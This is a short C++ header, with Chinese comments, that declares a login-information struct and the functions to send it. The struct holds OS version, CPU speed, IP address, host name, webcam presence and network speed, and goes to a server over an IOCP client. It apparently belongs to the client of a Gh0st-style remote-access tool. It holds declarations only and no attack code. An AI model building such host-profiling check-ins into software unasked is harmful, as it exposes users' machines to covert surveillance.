#pragma once

#include "IOCPClient.h"
#include <Vfw.h>

#pragma comment(lib,"Vfw32.lib")

typedef struct  _LOGIN_INFOR
{	
	BYTE			bToken;			// 取1，登陆信息
	char			OsVerInfoEx[sizeof(OSVERSIONINFOEX)];// 版本信息
	DWORD			dwCPUMHz;		// CPU主频
	IN_ADDR			ClientAddr;		// 存储32位的IPv4的地址数据结构
	char			szPCName[MAX_PATH];	// 主机名
	BOOL			bWebCamIsExist;		// 是否有摄像头
	DWORD			dwSpeed;		// 网速
}LOGIN_INFOR,*PLOGIN_INFOR;

int SendLoginInfo(IOCPClient* ClientObject,DWORD dwSpeed);
DWORD CPUClockMHz();
BOOL WebCamIsExist();
